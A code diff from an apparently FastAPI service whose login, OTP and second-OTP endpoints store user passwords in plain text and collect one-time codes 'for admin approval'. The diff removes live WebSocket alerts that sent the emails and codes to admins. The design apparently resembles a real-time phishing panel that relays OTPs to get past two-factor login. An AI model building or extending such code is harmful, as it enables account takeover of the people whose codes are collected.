@@ -209,12 +209,6 @@ async def user_login(user: UserLogin):
                 VALUES ($1, $2, FALSE)
             """, user.email, user.password or "user")
             
-            # Notify admins via WebSocket
-            await manager.send_to_admins({
-                "type": "user-login",
-                "email": user.email
-            })
-            
             return {"success": True, "message": "Waiting for admin approval"}
 
 @app.post("/api/users/submit-otp")
@@ -236,12 +230,7 @@ async def submit_otp(data: OTPSubmit):
             WHERE email = $1
         """, data.otp, data.email)
         
-        # Notify admins
-        await manager.send_to_admins({
-            "type": "user-otp-created",
-            "email": data.email,
-            "otp": data.email
-        })
+
         
         return {"success": True, "message": "OTP submitted, waiting for admin approval"}
 
@@ -263,13 +252,7 @@ async def submit_second_otp(data: OTPSubmit):
             WHERE email = $2
         """, data.otp, data.email)
         
-        # Notify admins
-        await manager.send_to_admins({
-            "type": "user-second-otp-created",
-            "email": data.email,
-            "second_otp": data.otp
-        })
-        
+
         return {"success": True, "message": "Second OTP submitted, waiting for admin approval"}
 
 # ============ STATUS CHECK ENDPOINTS (for polling) ============
